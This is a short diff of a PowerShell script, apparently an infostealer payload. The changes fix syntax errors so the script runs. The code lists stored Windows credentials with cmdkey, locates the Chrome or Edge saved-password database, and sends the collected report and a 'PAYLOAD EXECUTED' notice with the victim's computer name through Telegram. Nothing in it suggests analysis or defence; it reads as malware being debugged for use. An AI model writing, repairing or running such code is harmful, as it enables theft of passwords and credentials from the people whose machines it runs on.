@@ -65,10 +65,10 @@ try { $os=(Get-CimInstance Win32_OperatingSystem).Caption; $cpu=(Get-CimInstance
 try {$creds=cmd /c cmdkey /list 2>$null; if($creds){$report+="`n<b>[CREDS]</b>`n$creds`n"} } catch {}
 # === BROWSER PASSWORDS ===
 $loginData="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
-if(-not(Test-Path$loginData)){$loginData="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"}
-if(Test-Path$loginData){$report+="`n<b>[BROWSER_PASSWORDS]</b>`nLogin Data: $loginData`n"}
+if(-not(Test-Path $loginData)){$loginData="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"}
+if(Test-Path $loginData){$report+="`n<b>[BROWSER_PASSWORDS]</b>`nLogin Data: $loginData`n"}
 
 # Send
 Send-Telegram -Message $report
-Send-Telegram -Message "[+] PAYLOAD EXECUTED on $env:COMPUTERNAME at $(Get-Date -f yyyy-MM-dd HH:mm:ss)"
+Send-Telegram -Message "[+] PAYLOAD EXECUTED on $env:COMPUTERNAME at $(Get-Date -f 'yyyy-MM-dd HH:mm:ss')"
 Write-Log "Done. Report sent."
